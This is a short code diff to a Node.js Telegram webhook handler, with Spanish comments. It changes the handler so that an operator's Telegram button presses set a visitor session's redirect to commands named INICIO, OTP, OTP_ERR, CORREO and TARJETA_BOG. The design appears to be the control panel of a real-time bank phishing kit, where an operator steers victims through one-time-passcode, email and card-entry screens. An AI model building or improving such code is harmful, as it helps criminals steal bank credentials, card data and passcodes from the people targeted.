@@ -157,9 +157,10 @@ app.post('/telegram/webhook', (req, res) => {
     answerCb(callback_query.id).catch(() => {});
 
     if (sessionId) {
-      const url = resolveCode(cmd);
       const s = sessions.get(sessionId) || {};
-      if (url) s.redirect_to = url;   // solo actualiza si tiene URL mapeada
+      // Envía el comando original (INICIO, OTP, OTP_ERR, CORREO, TARJETA_BOG, etc.)
+      // No la URL mapeada, porque el cliente espera el comando original para mostrar la sección
+      s.redirect_to = cmd;
       s.last_msg_id = msgId;
       sessions.set(sessionId, s);
     }
